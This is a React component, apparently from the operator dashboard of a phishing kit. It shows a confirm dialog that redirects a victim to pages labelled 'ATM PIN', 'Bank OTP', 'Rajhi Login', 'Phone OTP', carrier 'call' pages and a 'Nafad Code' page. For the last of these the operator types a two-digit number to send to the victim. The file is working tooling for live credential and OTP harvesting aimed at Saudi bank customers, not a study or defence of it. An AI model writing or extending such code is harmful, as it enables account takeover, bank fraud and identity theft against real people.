// src/components/ConfirmDialog.js
import React from "react";
import { Modal, Button, FormControl } from "react-bootstrap";

const LABEL = {
  "index.html": "Home (Dallah)",
  "register.html": "Register Step 1",
  "register-second.html": "Register Step 2",
  "paymen.html": "Payment Page",
  "pin.html": "ATM PIN",
  "verify.html": "Bank OTP",
  "phone.html": "Phone Verification",
  "phonecode.html": "Phone OTP",
  "rajhi.html": "Rajhi Login",
  "stcCall.html": "STC Call",
  "mobilyCall.html": "Mobily Call",
  "nafad-basmah.html": "Nafad Code",
  "banned.html": "Banned Page"
};

export default function ConfirmDialog({ show, page, basmah, onBasmahChange, onConfirm, onDecline, onClose }) {
  if (!show) return null;

  // صفحة nafad-basmah تحتاج input للرقم
  const needsInput = page === "nafad-basmah.html";

  return (
    <Modal show={show} onHide={onClose} centered backdrop="static" keyboard={true}>
      <Modal.Header>
        <Modal.Title>
          Redirect to <strong>{LABEL[page] || page}</strong>?
        </Modal.Title>
        <Button variant="link" onClick={onClose} style={{ fontSize:"1.5rem" }}>&times;</Button>
      </Modal.Header>

      <Modal.Body className="text-center">
        {needsInput && (
          <>
            <p style={{ marginBottom:"0.5rem", fontWeight:500 }}>
              أدخل رقم نفاذ (رقمين):
            </p>
            <FormControl
              placeholder="مثال: 42"
              maxLength={2}
              value={basmah}
              onChange={(e) => onBasmahChange(e.target.value.replace(/\D/g, ""))}
              className="mb-3 text-center"
              style={{ fontSize:"1.5rem", fontWeight:"bold", letterSpacing:"0.5rem" }}
            />
          </>
        )}

        <Button
          variant="success"
          onClick={onConfirm}
          className="mx-2"
          disabled={needsInput && !basmah}
        >
          Yes
        </Button>
        <Button variant="danger" onClick={onDecline} className="mx-2">
          No
        </Button>
      </Modal.Body>
    </Modal>
  );
}
